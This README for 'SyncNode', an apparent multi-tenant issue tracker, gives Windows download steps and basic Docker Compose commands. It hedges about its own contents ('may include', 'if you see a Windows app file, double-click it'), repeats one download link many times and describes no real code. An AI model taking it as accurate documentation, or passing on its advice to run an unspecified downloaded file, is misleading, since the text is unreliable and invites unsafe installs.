# 🧭 SyncNode - Track Issues With Clear Control

[![Download SyncNode](https://img.shields.io/badge/Download-SyncNode-blue?style=for-the-badge&logo=github)](https://github.com/uninhabited-puppeteer693/SyncNode)

## 📥 Download SyncNode

Visit this page to download and run the app on Windows:

https://github.com/uninhabited-puppeteer693/SyncNode

Use the page to get the latest version, then follow the steps below to start the app on your computer.

## 🖥️ What SyncNode Does

SyncNode is an issue tracking app for teams and groups that need a clear way to manage tasks, bugs, and requests. It uses a web interface, so you can open it in your browser after you start it on your computer.

You can use SyncNode to:

- Create and track issues
- Organize work by team or tenant
- Set user roles and access levels
- Keep track of status, priority, and progress
- Work with a simple dashboard view
- Use the app on a local Windows machine

## ✅ Before You Start

Use a Windows PC with:

- Windows 10 or Windows 11
- At least 4 GB of RAM
- 2 GB of free disk space
- A modern browser like Chrome, Edge, or Firefox
- Internet access for the first download

If you plan to run the full app stack, Docker Desktop is the easiest way to start it.

## 🚀 Download and Run on Windows

Follow these steps in order:

1. Open the download page:
   https://github.com/uninhabited-puppeteer693/SyncNode

2. On the GitHub page, look for the latest release or the main project files.

3. Download the app files to your computer.

4. If the project is provided as a zip file, right-click the file and choose Extract All.

5. Open the extracted folder.

6. If you see Docker Compose files, use Docker Desktop to start the app.

7. If you see a Windows app file, double-click it to run the program.

8. Wait for the app to finish starting.

9. Open your browser.

10. Use the local address shown in the terminal, browser, or setup notes.

## 🐳 Run with Docker Desktop

If the project uses Docker, this is the simplest way to run it on Windows.

1. Install Docker Desktop from the official Docker site.
2. Open Docker Desktop and wait until it starts.
3. Download SyncNode from:
   https://github.com/uninhabited-puppeteer693/SyncNode
4. Extract the files if needed.
5. Open the folder that contains the docker-compose file.
6. Open PowerShell in that folder.
7. Run:

docker compose up -d

8. Wait a few minutes while the app starts.
9. Open your browser and go to the local web address shown by the app.

If the app includes a MySQL container, Docker will start that too.

## 🔑 First-Time Setup

When SyncNode starts for the first time, you may need to set up:

- An admin account
- A workspace or tenant name
- A team name
- A password
- Basic company details

Use a strong password and save it in a safe place. If the app shows a setup page, complete each step before you begin using it.

## 🧩 What You Can Expect in the App

SyncNode is built for issue tracking, so the main screen should help you:

- See open issues
- Check assigned work
- Change issue status
- Add comments
- Sort issues by team or tenant
- Review user roles
- Manage access with RBAC rules

The interface uses a clean layout so you can move between tasks without much confusion.

## 👥 Multi-Tenant Use

SyncNode supports more than one tenant. That means one app can serve more than one group while keeping data separate.

This helps when:

- Different departments need their own issue lists
- Multiple clients use the same system
- Each tenant needs its own users and roles
- You want one place to manage several workspaces

## 🔐 Roles and Access

SyncNode includes role-based access control, also called RBAC. This lets you control what each user can do.

Common roles may include:

- Admin
- Manager
- Developer
- Viewer

With roles in place, you can limit who creates issues, changes settings, or sees private data.

## 🗂️ Common Issue Fields

When you create or edit an issue, you may see fields like:

- Title
- Description
- Status
- Priority
- Assignee
- Due date
- Tenant
- Tags

Use short, plain text for titles. Add clear details in the description so your team can act fast.

## 🌐 Browser Use

SyncNode runs in a browser after startup. You do not need to keep opening files once the app is live.

Recommended browsers:

- Microsoft Edge
- Google Chrome
- Mozilla Firefox

If the page does not open, check the local address shown during startup and paste it into the browser bar.

## 🛠️ Troubleshooting

If the app does not start, check these points:

- Docker Desktop is running
- You are in the correct folder
- The download finished fully
- No other app is using the same port
- Your browser cache is not blocking the page

If the page stays blank:

- Refresh the browser
- Wait a little longer for the app to finish loading
- Check that the backend service is running
- Try another browser

If the database does not connect:

- Make sure the MySQL container is up
- Check your .env file if the project uses one
- Restart the containers with:

docker compose down

docker compose up -d

## 📁 Typical Folder Layout

You may see folders like these after download:

- backend
- frontend
- docker
- config
- migrations
- scripts

You may also see files such as:

- docker-compose.yml
- .env.example
- README.md

These files help the app run on your local machine.

## 🧪 Main Tech Used

SyncNode uses modern web tools, which may include:

- FastAPI for the server
- React 19 for the user interface
- MySQL for data storage
- SQLAlchemy for database work
- Tailwind CSS for page styling
- Vite for frontend builds
- Docker for local setup

You do not need to know how these work to use the app.

## 📌 Useful Commands

If you are using Docker on Windows, these commands may help:

Start the app:

docker compose up -d

Stop the app:

docker compose down

View logs:

docker compose logs -f

Restart the app:

docker compose restart

## 🔄 Updating the App

To get the latest version:

1. Return to the download page:
   https://github.com/uninhabited-puppeteer693/SyncNode
2. Download the newest files
3. Replace the old folder or update your Docker setup
4. Start the app again

## 💡 Quick Use Guide

After the app opens:

1. Sign in
2. Open the issues list
3. Create a new issue
4. Assign it to a user
5. Set priority and status
6. Add notes as work moves forward
7. Review progress by tenant or team

## 🧭 Why People Use SyncNode

SyncNode fits teams that need:

- One place for issue tracking
- Separate spaces for different tenants
- Role control for users
- A web app that runs on Windows
- A clear setup with Docker

## 📎 Download Link

Download or run SyncNode from:

https://github.com/uninhabited-puppeteer693/SyncNode